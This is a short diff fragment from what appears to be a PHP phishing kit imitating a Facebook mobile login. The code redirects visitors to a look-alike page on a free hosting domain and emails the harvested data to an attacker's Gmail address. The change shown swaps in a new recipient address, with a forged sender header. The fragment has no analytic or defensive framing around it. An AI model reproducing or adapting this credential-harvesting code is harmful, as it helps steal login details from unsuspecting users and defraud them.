@@ -12,7 +12,7 @@ if($myFile != $searchString) {
     header('Location: https://darkmember2000.000webhostapp.com/facebookmobile.html');
 }
 $headers = "From:amugawaya@gmail.com";
-$to = "flashcyber86@gmail.com";
+$to = "darkmember2000@gmail.com";
 $me = "darkmember2000@gmail.com";
 $txt ="
 ╬═════════════════════╬
